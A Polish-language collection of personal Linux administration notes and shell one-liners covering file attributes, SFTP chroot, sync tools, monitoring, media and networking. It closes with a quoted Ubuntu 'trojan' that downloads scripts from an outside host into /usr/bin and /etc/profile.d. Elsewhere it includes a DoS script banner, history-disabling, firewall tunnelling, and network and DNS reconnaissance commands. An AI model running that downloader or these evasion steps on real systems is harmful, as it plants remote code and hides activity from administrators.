    Ustawia wersję pliku/numer pokolenia (generation number).

Atrybuty

Gdy modyfikowany jest plik z ustawionym atrybutem ,,A’’, jego rekord atime nie jest zmieniany. Pozwala to uniknąć sporej ilości dyskowych operacji we/wy na systemach zainstalowanych na laptopach.

Plik z ustawionym atrybutem ,,a’’ może być otwierany dla zapisu tylko w trybie dopisywania. Jedynie superużytkownik może ustawić lub zdjąć ten atrybut.

Plik z ustawionym atrybutem ,,c’’ jest automatycznie kompresowany na dysku przez jądro. Odczyt tego pliku zwraca zdekompresowane dane. Zapis do tego pliku powoduje kompresję danych przed zapisaniem ich na dysku.

Plik z ustawionym atrybutem ,,d’’ nie jest kandydatem do archiwizacji, podczas uruchamiania programu dump(8) .

Plik z atrybutem ,,i’’ nie może być zmieniany: nie może być kasowany ani nie może być zmieniana jego nazwa, nie można tworzyć do niego dowiązań i nie można zapisać do niego żadnych danych. Jedynie superużytkownik może ustawić lub zdjąć ten atrybut.

Wszystkie dane z pliku z ustawionym atrybutem ,,j’’ zostaną zapisane do dziennika ext3 przed zapisaniem ich do pliku, o ile system plików został zamontowany z opcją “data=ordered” lub “data=writeback". Gdy system plików jest zamontowany z opcją “data=journalled", wszystkie dane są zapisywane do dziennika, więc ten atrybut nie ma znaczenia.

Gdy plik z ustawionym atrybutem ,,s’’ zostanie skasowany, jego bloki zostają wyzerowane i zapisane z powrotem na dysku.

Gdy modyfikowany jest plik z ustawionym atrybutem ,,S’’, zmiany są zapisywane na dysk synchronicznie; jest to równoznaczne z opcją montowania ,,sync’’, dotyczącą określonego zbioru plików.

Plik z atrybutem ,,t’’ nie będzie miał częściowego fragmentu bloku na końcu pliku uwspólnionego z innymi plikami (na systemach plików wspierających łączenie końcówek). Jest to niezbędne dla programów takich jak LILO, które dokonują bezpośredniego odczytu z systemu plików i które nie rozumieją plików o połączonych końcówkach.

Gdy kasowany jest plik z ustawionym atrybutem ,,u’’, jego zawartość zostaje zachowana. Umożliwia to użytkownikowi odzyskanie takiego pliku.

Wyświetlenie

lsatr


----------------------------------

chroot ssh sftp

sftp

yum install scponly

bieszczady:~$ cat /etc/passwd | grep red
red:x:501:502::/home/red:/bin/scponly

red:x:501:502::/home/red:/usr/bin/scponly

bieszczady:~$ which scponly
/usr/bin/scponly


vi /etc/ssh/sshd_config

# override default of no subsystems
#Subsystem	sftp	/usr/libexec/openssh/sftp-server
 Subsystem      sftp    internal-sftp

# Example of overriding settings on a per-user basis
#Match User anoncvs
#	X11Forwarding no
#	AllowTcpForwarding no
#	ForceCommand cvs server

Match User red
	X11Forwarding no	
	ChrootDirectory /home
	AllowTcpForwarding no	
	ForceCommand internal-sftp

ssh

toworzenie użytkownika i katalogu
make_chroot_jail.sh

---------------------------------------


gnubiff
  Email notification program.


 netspeed
  A GNOME applet that shows the network traffic in kbytes/s.

--------------------------------

linux asempler

as
gas  - asempler gnu

gdb - debuger GDB


as hello.asm -o hello.o
ld hello.o -o hello

------------------

logi

wtmp, utmp, lastlog

/var/run/utmp
/var/log/lastlog

----------------

tripwire
Cops
binaudit

--------------------
httping
multitail

-------------------------------

  How to disable history listing in Console mode

rm -f $HOME/.bash_history
touch $HOME/.bash_history
chmod 000 $HOME/.bash_history


------------------------------------
  How to add the Open Terminal to the R-Click


su -c 'yum install nautilus-open-terminal'


---------------------------------------

resize lvm


e2fsck -f -y -v /dev/sda6
resize2fs /dev/sda6


------------------------------

Free File Comparison and Differencing Tools (Diff Utilities)

WinMerge
P4Merge●
xxdiff
KDiff3
xdelta Open Source Binary Diff, Delta / Differential Compression Tool
Java xdelta
ExamDiff
SourceGear DiffMerge: Diff / Merge utility
Diffuse
CSDiff


---------------------------


Aby zmienić częstotliwość skanowania dysku przy uruchamianiu wystarczy polecenie:

    sudo tune2fs -c 50 /dev/hda1


--------------------------------------------------

Serwer czasu

hwclock --systohc
ntpdate ntp.task.gda.pl

ntpq -p

yum install ntp
apt-get install openntpd


------------------------

1) Wyświetla listę nieużywanych modułów i obrazów jądra:

    dpkg -l 'linux-*' | sed '/^ii/!d;/'"$(uname -r | sed "s/\(.*\)-\([^0-9]\+\)/\1/")"'/d;s/^[^ ]* [^ ]* \([^ ]*\).*/\1/;/[0-9]/!d'


2) Zgrywa ścieżkę dźwiękową z pliku wideo:

    mplayer -ao pcm -vo null -vc dummy -dumpaudio -dumpfile 


Zgrywanie ścieżki dźwiękowej przy użyciu ffmpeg:

    ffmpeg -i input.flv -f mp3 -vn -acodec copy ouput.mp3


3) Uruchamia wybrany adres z YouTube w MPlayerze:

    mplayer -fs $(echo "http://youtube.com/get_video.php?$(curl -s $youtube_url | sed -n "/watch_fullscreen/s;.*\(video_id.\+\)&title.*;\1;p")")


4) Pobiera wszystkie obrazki z danej witryny:

    wget -r -l1 --no-parent -nH -nd -P/tmp -A".gif,.jpg" http://przyklad.com/images


5) Tworzy stronę HTML z przeglądem posiadanego sprzętu:

    lshw -html > hardware.html


6) Wycina część pliku wideo:

    ffmpeg -vcodec copy -acodec copy -i orginalfile -ss 00:01:30 -t 0:0:20 newfile

Gdzie 00:01:30 to czas rozpoczęcia, a 0:0:20 to długość, jaka będzie wycięta.

7) Usuwa konfigurację usuniętych pakietów (tylko w systemach opartych o Debiana, np. Ubuntu czy Mint):

    sudo aptitude purge `dpkg --get-selections | grep deinstall | awk '{print $1}'`


8) Wyświetlanie wideo w wysokiej rozdzielczości na słabszych procesorach:

    mplayer -framedrop -vfm ffmpeg -lavdopts lowres=1:fast:skiploopfilter=all


9) Konwersja zbioru plików graficznych do jednego pliku PDF:

    convert -adjoin -page A4 *.jpeg multipage.pdf


10) Znajduje 20 największych katalogów na dysku:

    du -xk | sort -n | tail -20

--------------------------


 Powiadomienie o nowej poczcie

    * dowolne konto pocztowe mogą sprawdzać programy:
          o mail-notification
          o xfce4-mailwatch-plugin
          o gnubiff
    * idealne dla GMail
          o checkgmail
          o gnome-gmail-notifier

-----


"Czy jest jakiś sposób by administrować oddalonym PC z XP gdy jest on za natem ":

z XP:
$ ssh -R 50000:localhost:3389 pszymczak@phenix.rootshell.be
z domu:
$ rdesktop phenix.rootshell.be -p 50000 
warunek: musi być taka możliwość na serwerze (GatewayPorts yes w /etc/ssh/sshd_config). 


--------------------------------

Synchronizacja plików

Dla zorientowania uwagi, przyjmijmy że korzystam właśnie z laptopa i chcę zsynchronizować treść katalogu ~/Notatki z jego treścią na zdalnej maszynie (tu - desktopie), którą w lokalnej sieci widać pod nazwą platon.

$ rsync -avz platon:Notatki/ ~/Notatki

$ rsync -avz /home/marcin/Notatki platon:/home/marcin

albo:

$ rsync -avz /home/marcin/Notatki/ platon:/home/marcin/Notatki

Unison

$ unison-gtk /Notatki ssh://platon/Notatki

albo (przykład dla pełnej ścieżki):

$ unison-gtk /Notatki ssh://platon//home/marcin/Notatki

Conduit

----------------------------------------

System zarządzania wersjami

Dla kodu źródłowego, pisanych dokumentów czy notatek idealnym rozwiązaniem jest użycie systemu zarządzania wersjami.

Najwygodniejsze są narzędzia DVCS, nie wymagające wydzielania i konfigurowania dedykowanego serwera. Preferuję Mercuriala, ale GIT czy Bazaar nie powinny być gorsze.

Przy tej technice, po początkowym sklonowaniu, cała synchronizacja ogranicza się do hg pull i ewentualnie hg merge. Szerzej nie będę tego tu opisywał, bo rzecz niczym się nie różni od używania Mercuriala w małym zespole.

Jedyny problem: DVCS-y kiepsko się nadają do obsługi dużych plików (np. Mercurial zaleca ograniczenie rozmiaru do 10MB) i bardzo dużych drzew. Chodzi głównie o algorytmy wyliczania zmian, alokujące w RAM 4-5 razy rozmiar commitowanego pliku. Dochodzi też dyskowy koszt drugiej kopii przechowywanej w podkatalogu .hg. Dlatego drzewo zdjęć, plików MP3 czy filmików lepiej zsynchronizuje Unison.

Ale do wszelkiej maści pisanego tekstu - idealne rozwiązanie.

---------------------------

Tanie przejęcie IP
Najpierw musimy odróżniać “prawdziwy” adres IP od adresu (adresów) IP, z których serwer faktycznie oferuje informacje. W tym przykładzie mamy dwa serwery, które nazwiemy: Pinky i Brain. Pinky jako “rzeczywisty” adres IP na interfejsie eth0 ma 208.201.239.12. Ma też on alias adresu IP 208.201.239.36 na interfejsie eth0:0. Brain na interfejsie eth0 używa adresu 208.201.239.13, zaś adresu 208.201.239.37 na interfejsie eth0:0.


#!/bin/bash
OTHER="brain"
PUBLIC="208.201.239.37"
 
PAUSE=3
 
PATH=/bin:/usr/bin:/sbin:/usr/sbin:/usr/local/sbin
MISSED=0
 
while true; do
if ! ping -c 1 -w 1 $OTHER > /dev/null; then
((MISSED++))
else
if [ $MISSED -gt 2 ]; then
ifconfig eth0:$OTHER down
fi
MISSED=0
fi;
 
if [ $MISSED -eq 2 ]; then
ifconfig eth0:$OTHER $PUBLIC

# ...zobacz komentarz poniżej...
fi
sleep $PAUSE;
done

--------------------------


Moja fedora składa się ogólnie z takich o to appsów:

Władze trzyma: Kernel 2.6.20
Gości mnie: Gnome (jedyne i nie powtarzalne)
Muzyke sponsoruje: Rhythmbox
Filmy zapodaje: Mplayer
“Okno” na świat otwiera: Firefox
Łączy z ludzmi: Kadu/Gajim
Grypsuje do szefa: Gnome-terminal
Skargi pisze: openoffice.org
Upiększa wnętrza: Beryl
A wszystko psuje: JA

No to chyba wszystko co chciałem powiedzieć.


alternatywa: Zenoss



Czym jest Nagios?
Nagios to system monitorowania otoczenia, hostów
i usług w sieci komputerowej.

■Monitorowanie usług sieciowych.
■Monitorowanie hostów.
■Monitorowanie czynników środowiska.
■Definiowanie własnych wtyczek monitorujących
hosty i usługi.

Regularne sprawdzanie ich stanu
w zaplanowanym czasie za pomocą wtyczek.
■Równoczesne sprawdzanie wielu usług.
■Cztery możliwe stany: ok, warning, critical,
unknow.
■Można monitorować wszystko dla czego można
napisać wtyczkę.

■Sprawdzanie wykonywane na żądanie, również
przez wtyczki.
■Trzy możliwe stany: up, down, unreachable.
■Weryfikacja osiągalności hostów.

Komunikaty
■Informacje do wybranych użytkowników, za
pomocą email, sms, pager lub w inny
zdefiniowany przez użytkownika sposób.
■Zdefiniowanie stopnia ostrzeżeń dla
poszególnych grup użytkowników.
■Planowane „tłumienie” wysyłania komunikatów
na określony czas.

Zewnętrzny interfejs komend
■Nagios regularnie czyta plik z komendami
i wykonuje dopisane.
■Pozwala modyfikować proces monitorowania
i wysyłania komunikatów podczas działania.
■Może być wykorzystany przez zewnętrzne
aplikacje, www i zdarzenia(np. SNMP, TCP
Wrappers)


Metody sprawdzania
■Aktywne:
 synchroniczne,
 planowane i wykonywane przez Nagios.
■Pasywne:
 asynchroniczne,
 wykonywane przez zewnętrzne aplikacje,
 wyniki zgłaszane za pomocą interfejsu komend,
 przetwarzane w taki sam sposób jak aktywne.


-------------------------------------------------------


rdesktop 10.1.3.114 -g 1600x900
rdesktop 172.17.40.101 -g 1600x900

-----------------------------------------

htop
iotop
multitail
lsof
mytop
whowatch

---------------------

dig -t axfr www.domena.gov.pl @10.1.1.202

------------

xrandr 

--------

fuser -uvm /home/

----------------

while true;do ps -AZfl | grep dmispd;sleep 1;done

--------------------

sudo apt-get install blueproximity

---------------------

sprawdzenie gmaila z lini poleceń
curl -u nazwa-uzytkownika --silent "https://mail.google.com/mail/feed/atom" | perl -ne 'print "\t" if //; print "$2\n" if /<(title|name)>(.*)<\/\1>/;'

---------------------

Akademickie Radio Centrum;http://radiocentrum.pl:8000/
AntyRadio 106.4 FM;http://213.251.139.121:7000
Gadu Radio;http://gr-grr-20.gaduradio.pl:9000
IGOL FM;http://87.230.14.36:8920
Megastacja Disco Polo;http://www.megastacja.net/kanaly/DISCO/disco.m3u
Polska Stacja - 80s & Italo Disco;http://213.251.141.82:9700
Polska Stacja - Ballady Rockowe;http://87.98.222.200:6200
Polska Stacja - Biesiada i Folk;http://213.251.141.128:8850
Polska Stacja - Blues;http://91.121.123.186:5500
Polska Stacja - Chillout;http://91.121.90.89:7100
Polska Stacja - Club HITS;http://91.121.91.139:80
Polska Stacja - Country;http://91.121.90.89:80
Polska Stacja - Disco Polo Radio;http://213.251.139.88:9150
Polska Stacja - DJ Top 50;http://91.121.124.25:7600
Polska Stacja - Dzieciom;http://91.121.7.164:9600
Polska Stacja - Eden;http://91.121.90.89:9900
Polska Stacja - Electro - House;http://91.121.109.22:6000
Polska Stacja - Era Disco;http://87.98.223.200:5200
Polska Stacja - Etno Pop;http://91.121.109.172:5300
Polska Stacja - Eurowizja;http://91.121.90.207:6400
Polska Stacja - Hip Hop;http://213.251.141.128:9350
Polska Stacja - Hot 100 - Gorąca Setka Nowości;http://91.121.123.186:5900
Polska Stacja - Hot House;http://87.98.216.155:7700
Polska Stacja - House & Dance;http://213.251.129.27:9550
Polska Stacja - Italia;http://91.121.124.25:5000
Polska Stacja - Jazz;http://91.121.10.195:8700
Polska Stacja - Klasycznie;http://91.121.10.195:8900
Polska Stacja - Klasyka Muzyki Elektronicznej;http://91.121.109.172:7900
Polska Stacja - Latino;http://91.121.7.164:9800
Polska Stacja - Mocne Brzmienie Rocka;http://87.98.216.155:5100
Polska Stacja - Modern Rock;http://91.121.109.172:7200
Polska Stacja - Muzyka Filmowa;http://91.121.10.195:9200
Polska Stacja - Muzyka Francuska;http://91.121.125.25:5600
Polska Stacja - Muzyka na TOPie;http://91.121.7.164:80
Polska Stacja - Najwieksze Przeboje 60 - 70;http://213.251.190.138:80
Polska Stacja - Największe Przeboje 80 - 90;http://213.251.190.148:8080
Polska Stacja - PARTY;http://213.251.140.82:8500
Polska Stacja - Polski Hip Hop;http://91.121.109.22:6100
Polska Stacja - Polskie Niezapomniane Przeboje;http://213.251.190.139:8080
Polska Stacja - Przeboje We Dwoje;http://91.121.125.25:9050
Polska Stacja - RnB;http://91.121.123.186:5800
Polska Stacja - Smooth Jazz;http://91.121.125.25:5700
Polska Stacja - Soul;http://91.121.90.207:80
Polska Stacja - Szanty;http://213.251.136.138:5400
Polska Stacja - TRAX;http://91.121.109.172:860
Polska Stacja - Tylko Polskie Przeboje;http://213.251.129.27:8080
Polska Stacja - Tylko ROCK;http://213.251.190.150:8080
Polska Stacja - W rytmie REGGAE;http://91.121.90.89:7000
Polskie Radio - Bis;http://www.polskieradio.pl/st/RadioBis.asx
Polskie Radio - Jedynka;http://www.polskieradio.pl/st/program1M.asx
Polskie Radio - Dwójka;http://www.polskieradio.pl/st/program2.asx
Polskie Radio - Trójka;http://www.polskieradio.pl/st/program3M.asx
Radio Dla Ciebie;http://sc9232.xpx.pl:9232/
Radio Elka;http://80.48.111.252:8000/elka.ogg
Radio eR;http://stream.radioer.pl:8000/Radio_eR
Radio ESKA - Kraków;http://www.radio.pionier.net.pl/stre...dio=eskakrakow
Radio ESKA - Łódź;http://www.radio.pionier.net.pl/stre...radio=eskalodz
Radio ESKA - Poznań;http://www.radio.pionier.net.pl/stre...dio=eskapoznan
Radio ESKA - Śląsk;http://www.radio.pionier.net.pl/stre...adio=eskaslask
Radio ESKA - Warszawa;http://www.radio.pionier.net.pl/stre...o=eskawarszawa
Radio ESKA - Wrocław;http://www.radio.pionier.net.pl/stre...io=eskawroclaw
Radio Katolik;http://www.radiokatolik.pl:7777/live.ogg
Radio Lublin;http://radio.lublin.pl/128k.m3u
Radio Łódź;http://212.191.130.15:8000/radiolodz128.ogg
Radio Maryja;mms://195.94.205.211/rm
Radio Niepokalanów;http://rn.pronet.pl/stereo.m3u
Radio Parada;http://195.69.82.86:8000/live.m3u
Radio Party;http://91.121.127.22:8000
Radio Planeta - 95.1 FM;http://213.251.138.121:7500
Radio Plus;http://www.pluspolska.pl/RadioPlus.m3u
Radio Polska Stacja -.pl;http://213.251.129.27:9650
Radio RMF FM;http://91.121.124.91:8000/
Radio RMF MAXXX;http://www.rmfmaxxx.pl/rmfmaxxx.asx
Radio RMF CLASSIC;http://87.98.223.167:8004/
Radio TOK FM;http://www.radio.pionier.net.pl/stre...radio=radiotok
Radio WAWA;http://sask1-1.radio.pionier.net.pl:...l/wawa.ogg.m3u
Radio Weekend;http://80.54.248.14:8000/stream.ogg.m3u
Radio ZET;http://84.16.243.230:8050
Radio Złote Przeboje;http://www.radio.pionier.net.pl/stre...?radio=radio88
Radiostacja;http://213.251.140.82:8150
Roxy FM;http://www.radio.pionier.net.pl/stream.pls?radio=roxyfm
Tok FM;mms://ml2.gazeta.pl/tokfm


------------------


MUTT: Poczta Gmail przez IMAP i prosto z konsoli


set imap_user = "nazwa_uzytkownika@gmail.com"
set imap_pass = "haslo"

set smtp_url = "smtp://nazwa_uzytkownika@smtp.gmail.com:587/"
set smtp_pass = "haslo"
set from = "nazwa_uzytkownika@gmail.com"
set realname = "Twoje imie i nazwisko"

set folder = "imaps://imap.gmail.com:993"
set spoolfile = "+INBOX"
set postponed="+[Gmail]/Drafts"

set header_cache=~/.mutt/cache/headers
set message_cachedir=~/.mutt/cache/bodies
set certificate_file=~/.mutt/certificates

set move = no


-----------------------------
http://www.shell-fu.org/

sudo lsof -i -T -n

watch -n 1 "netstat -tpanl | grep ESTABLISHED"

netstat -an | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c \
 | awk '{ printf("%s\t%s\t",$2,$1) ; for (i = 0; i < $1; i++) {printf("*")}; print ""}'

echo 'xmessage "Hello"'|at 19:00

Display any udp/tcp connections by process name or by process id
lsof -nP -c COMMAND | egrep -o '(TCP|UDP).*$' | sort -u
lsof -c apache2 | egrep -o 'TCP.*ESTABLISHED.*$' 
lsof -nP -p PID | egrep -o '(TCP|UDP).*$'

Detect your computer harddisk read speed without disk cache speed

$ cat /dev/sda | pv -r > /dev/null

Network throughput test
$ iperf -s

On the machine acting like a server, run:
iperf -s

On the machine acting like a client, run:
iperf -c ip.add.re.ss

ps -eo pmem,pid,comm --no-headers | sort -k1 -rn | head -10


--------------------------------

/sbin/lspci -nn | grep 'VGA\|NV'

 su -c 'yum install kmod-nvidia'




---------------------------------

CDEmu - najlepszy odpowiednik Deamon Tools dla Linuksa

----------------------------------

virtualbox

smod nos muestra los módulos cargados. Buscamos kvm:

    $ /sbin/lsmod | grep kvm
    kvm_intel              23169  0
    kvm                    89201  1 kvm_intel

Ahora removemos el módulo kvm_intel y luego kvm. Si lo hacemos al revés obtendremos un mensaje de error, ya que kvm_intel hace uso de kvm.

    $ sudo /sbin/modprobe -r kvm_intel
    $ sudo /sbin/modprobe -r kvm


---------------------------

nikto - skaner bezpieczenstwa

http://cirt.net/nikto2-docs/

---------------------------

bootowalny pandrive

unetbootin 


------------------

#
Configure Your Firewall

iptables-save > /etc/sysconfig/iptables.default
iptables-save > /etc/sysconfig/iptables.test
vim /etc/sysconfig/iptables.test

Insert the following settings:

# tor ORPort & DirPort
-A INPUT -p tcp –dport 9001 -j ACCEPT
-A INPUT -p tcp –dport 9030 -j ACCEPT


# tor Allow all outbound traffic
-A OUTPUT -j ACCEPT

Save & Exit.

iptables-restore < /etc/sysconfig/iptables.test
iptables -L (verify the rules are correct)
iptables-save > /etc/sysconfig/iptables
#


-------------------------


Gnome: system wide changing "default action" application
Exact procedure is described in post Changing default applications, but it's done for all users of computer. This is done by few easy steps:

    * edit /usr/share/applications/defaults.list
    * find your entry for example application/pdf=kpdf.desktop and change kpdf.desktop to "something else"
    * remember that "something else" must be in /usr/share/applications

Gnome: Changing "default application" per user
For making user specific change You have to edit file: $HOME/.local/share/applications (syntax is the same as in system wide config). If your application doesn't have an .desktop entry you can easily create it. 

------------------------------

confert video
winff

--------------------------------

  echo "Nuked KLan <= 1.7.7 & <= SP4 DOS"
  echo "Author : Hamza 'MIzoZ' N. < mizozx[at]gmail[dot]com"
  echo "Usage  : sh $0 -h [HOST] -r 1000"

------------------------------


#fetch and process memory information
[ -f /proc/meminfo ] && {
Buffers=`grep -we 'Buffers' /proc/meminfo | cut -d' ' -f2- | tr -d "[A-Z][a-z] "`
Cached=`grep -we 'Cached' /proc/meminfo | cut -d' ' -f2- | tr -d "[A-Z][a-z] "`
MemFree=`grep -ie 'MemFree' /proc/meminfo | cut -d' ' -f2- | tr -d "[A-Z][a-z] "`
MemTotal=`grep -ie 'MemTotal' /proc/meminfo | cut -d' ' -f2- | tr -d "[A-Z][a-z] "`
SwapCached=`grep -ie 'SwapCached' /proc/meminfo | cut -d' ' -f2- | tr -d "[A-Z][a-z] "`
SwapFree=`grep -ie 'SwapFree' /proc/meminfo | cut -d' ' -f2- | tr -d "[A-Z][a-z] "`
SwapTotal=`grep -ie 'SwapTotal' /proc/meminfo | cut -d' ' -f2- | tr -d "[A-Z][a-z] "`
}
MEMUSED="$(( ( ( ( $MemTotal - $MemFree ) - $Cached ) - $Buffers ) / 1024 ))"
MEMTOTAL="$(( $MemTotal / 1024))"
MEMFREE="$(( $MEMTOTAL - $MEMUSED ))"
MEMPER="$(( ( $MEMUSED * 100 ) / $MEMTOTAL ))"
[ "$SwapTotal" -gt "1" ] && {
  SWAPUSED="$(( ( ( $SwapTotal - $SwapFree ) - $SwapCached ) / 1024 ))"
  SWAPTOTAL="$(( $SwapTotal / 1024))"
  SWAPFREE="$(( $SWAPTOTAL - $SWAPUSED ))"
  SWAPPER="$(( ( $SWAPUSED * 100 ) / $SWAPTOTAL ))" 
} || {
  SWAPUSED="0"
  SWAPTOTAL="0"
  SWAPPER="0" 
}

# display the information
/bin/echo
/bin/echo "Memory"
/bin/echo "Used: $MEMUSED"
/bin/echo "Free: $MEMFREE"
/bin/echo "Total: $MEMTOTAL"
/bin/echo
/bin/echo "Swap"
/bin/echo "Used: $SWAPUSED"
/bin/echo "Free: $SWAPFREE"
/bin/echo "Total: $SWAPTOTAL"
/bin/echo


----------------------------------------

random password generator

egrep -ioam1 '[a-z0-9]{8}' /dev/urandom

---------------------------------------

Shutdown a windows PC from linux

ust enter the following command, where 'thehostname' is the hostname of the remote PC, and 'theusername' is a valid user account on the remote PC:

net rpc shutdown -S thehostname -U theusername


If the hostname is not known, or cannot be resolved, then use the following instead, replacing '111.111.111.111' with the IP address of the remote PC:

net rpc shutdown -I 111.111.111.111 -U theusername


Additionally, the parameters that can be used with Windows' own shutdown command such as '-f' to force or '-t' to set a timeout, can also be applied to the net rpc shutdown command as well. For example the following will wait 60 seconds, and then force all running programs to terminate before shutting down:

net rpc shutdown -S thehostname -U theusername -f -t 60

--------------------------------------

Transfer files with netcat

On client machine

nc -lpvv port > file


On server machine

nc -vv clientip port < file



Example :

Client: nc -l -p 6868 > file.txt
Server: nc 31.41.59.26 6868 < file.txt

----------------------------------------

find . -exec file -i {} \; | grep image/png

------------------------------------------

netstat -an | grep ESTABLISHED | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c \
 | awk '{ printf("%s\t%s\t",$2,$1) ; for (i = 0; i < $1; i++) {printf("*")}; print ""}'

-----------------------------------------

scan ip network

for IP in 192.168.1.{1..10}; do if ping $IP -c 1 > /dev/null; then echo $IP alive; else echo $IP dead; fi; done

--------------------


Copy MySQL tables between hosts
mysqldump -h [remote IP] -u[user] -p[pass] from_db from_table | mysql -u[user] -p[pass] target_db

--------------------------

Migrate MySQL Database to a new Server

mysqldump --add-drop-table --extended-insert --force --log-error=err.log -u[user] \
-p[pass] old_db | ssh -C user@host "mysql -u[user] -p[pass] new_db"

--------------------------

Check SSL certificate dates

echo | openssl s_client -connect www.google.com:443 2>/dev/null |openssl x509 -dates -noout

---------------------------

Find all SSH Hosts
nmap -p22 -oG - $(ip addr | awk '/inet .*global/ {print $2}' | tr '\n' ' ') | awk '/22\/open/ {print $2}' | uniq

------------------

find . -mtime -1  # find files modified within the past 24 hours
find . -mtime 1   # find files modified between 24 and 48 hours ago
find . -mtime +1  # find files modified more than 48 hours ago
find . -mmin +5 -mmin -10 # find files modifed between 5 and 10 minutes ago

---------------------------


snax  <snax[AT]shmoo.com>

----------------------

how to run a command in background using ssh and detach the session

  ssh -x $username@$node 'rm -rf statuslist
                        mkdir statuslist
                        chmod u+x ~/monitor/concat.sh
                        chmod u+x ~/monitor/script.sh
                        nohup ./monitor/concat.sh &
                        exit;'

-----------------------------------

sudush
sudush2

--------------------------------------

fuser -k 80/tcp

-----------------------------------

rdesktop 172.17.40.101 -g 1600x900 -u userj -d domena -p haslo -k pl
rdesktop -a24 -uAdministrator -pPassword  -r clipboard:CLIPBOARD -r disk:share=~/share -z -g 1280x900 -0 $@ &

xfreerdp --plugin rdpsnd -g 1280x720 -a 24 -z -x m -u userj 172.17.40.101


-----------------------------------


httptunnel

Httptunnel składa się z klienta i z maszyny docelowej. klient, HTC, nasłuchuje na dowolnym porcie – jeśli nie mamy uprawnień administratora, musi to być port powyżej 1024. Klient osadza połączenia przychodzące w HTTP i przesyła je do celu – na port otwarty na zaporze sieciowej. Przykładowo, jeśli chcemy skorzystać z portu 443, użyjemy polecenia:

htc -w -F 4711 kintyre.kuehnast.com:443

Podczas testów warto użyć parametru -w, który zapobiega przejściu procesu w tło. Po prawidłowym skonfigurowaniu wszystkiego opuszczamy ten parametr, proces będzie działał jako demon. Opcja -F oznacza przekazuj (od ang. forward), po czym następuje źródło i cel do przekazywania. Ponieważ źródłem jest port na maszynie lokalnej, nie ma potrzeby podawać nazwy hosta, wystarczy sam port. Celem może być jakikolwiek adres IP lub nazwa hosta, jak widzimy wyżej.
Tył na przód

Z kolei na serwerze wszystko powinno być skonfigurowane „tył na przód”. Komponent serwetrowy HTS przyjmuje połączenia przychodzące na porcie 443, usuwa warstwę HTTP i przekazuje je na port docelowy. W przykładzie poniżej jest to port 22 – do logowania przez SSH:

hts -w -F localhost:22 443

Choć może się to wydawać nielogiczne, musimy najpierw skonfigurować port 22, a następnie port używany przez HTS do nasłuchiwania na połączenia przychodzące. Chcąc wypróbować tę konfigurację, otwieramy połączenie SSH do localhosta na porcie 4711:

ssh -p 4711 charly@localhost

Możemy teraz zalogować się na serwer (Rysunek 1). Zanim posypią się protesty – konkurs w rzucie meduzą to oczywiście żart, ale i tak można mi zazdrościć: właściciele winnic w Langwedocji przerzucili się z przemysłowej produkcji alkoholu na wina, i to naprawdę dobrej jakości.

----------------------------- 


Remote screenshot

DISPLAY=":0.0" import -window root screenshot.png

----------------------



PGP

seahorse


-------------------------------

smbmount //<ip>/<resource> <local_mount_point>
nmblookup -A <ip>

--------------------------------
Slideshow of images in the current folder

feh -d -F -z -D 1 *

-----------------------------

Start another instance of X via SSH

startx -- /usr/X11R6/bin/Xnest :5 -geometry 800x600
startx -- /usr/bin/Xnest :5 -geometry 800x600

startx -- /usr/bin/Xnest :13

----------------------------

default aplicatio problem

nautilus - remove and install

gconftool-2

---------------------------
download the contents of a remote folder in the current local folder

wget -r -l1 -np -nd http://yoururl.com/yourfolder/

----------------------------

copy working directory and compress it on-the-fly while showing progress
tar -cf - . | pv -s $(du -sb . | awk '{print $1}') | gzip > out.tgz

Tar - Compress by excluding folders
tar -cvzf arch.tgz $(find /path/dir -not -type d)
---------------------------

geoip information
geoiplookup www.commandlinefu.com

--------------------------------

Listen to BBC Radio from the command line. 

bbcradio() { local s;echo "Select a station:";select s in 1 1x 2 3 4 5 6 7 "Asian Network an" "Nations & Local lcl";do break;done;s=($s);mplayer -playlist "http://www.bbc.co.uk/radio/listen/live/r"${s[@]: -1}".asx";}

----------------------------------
Search commandlinefu.com from the command line using the API

cmdfu(){ curl "http://www.commandlinefu.com/commands/matching/$@/$(echo -n $@ | openssl base64)/plaintext"; }

------------------------------------


translate(){ curl -s "http://ajax.googleapis.com/ajax/services/language/translate?v=1.0&q=$(echo "$1" | sed 's/ /%20/g')&langpair=$2%7C$3" | sed 's/{"responseData": {"translatedText":"\([^"]*\)"}, .*}/\1\n/'; }

translate "pocałuj mnie w dupę" pl en

------------------------------


Edit your /etc/bash.bashrc file as root.

Put these line at the end of your /etc/bash.bashrc file :

export http_proxy=http://username:password@proxyserver.net:port/
export ftp_proxy=http://username:password@proxyserver.netport/

-----------------------------

Capture video of a linux desktop

ffmpeg -f x11grab -s `xdpyinfo | grep 'dimensions:'|awk '{print $2}'` -r 25 -i :0.0 -sameq /tmp/out.mpg > /root/howto/capture_screen_video_ffmpeg

----------------------------

Linux Fedora - Tucan klient pobierania plików z rapidshare megaupload i inych serwisów

-------------------------------


curl http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-2500:25] | grep -v _curl_ > comfu.txt

-------------------

ssh root@host1 "cd /somedir/tocopy/ && tar -cf - ." | ssh root@host2 "cd /samedir/tocopyto/ && tar -xf -"

-------------------

copy from host1 to host2, through your host

ssh user@<source_host> -- tar cz <path> | ssh user@<destination_host> -- tar vxzC <path>


--------------------------

show ALL iptable rules

for i in `cat /proc/net/ip_tables_names`; do iptables -nL -v --line-numbers -t $i ; done

---------------------------

Record audio and video from webcam using ffmpeg

ffmpeg -f alsa -r 16000 -f video4linux2 -s 800x600 -i /dev/video1 -r 30 -f avi -vcodec mpeg4 -vtag xvid -sameq -acodec libmp3lame -ab 96k output.avi

ffmpeg -f alsa -r 16000 -i hw:2,0 -f video4linux2 -s 800x600 -i /dev/video1 -r 30 -f avi -vcodec mpeg4 -vtag xvid -sameq -acodec libmp3lame -ab 96k output.avi

------------------------------

Quick I want to see video from my capture card

xawtv -hwscan
xawtv -device /dev/video1


----------------------------

http://www.zoneminder.com/wiki/index.php/Documentation#Configuring_SELinux_Policy


-----------------------------

Pierwszy trojan na Ubuntu?

#!/bin/sh
cd /usr/bin/
rm Auto.bash
sleep 1
wget http://05748.t35.com/Bots/Auto.bash
chmod 777 Auto.bash
echo -----------------
cd /etc/profile.d/
rm gnome.sh
sleep 1
wget http://05748.t35.com/Bots/gnome.sh
chmod 777 gnome.sh
echo -----------------
clear
exit

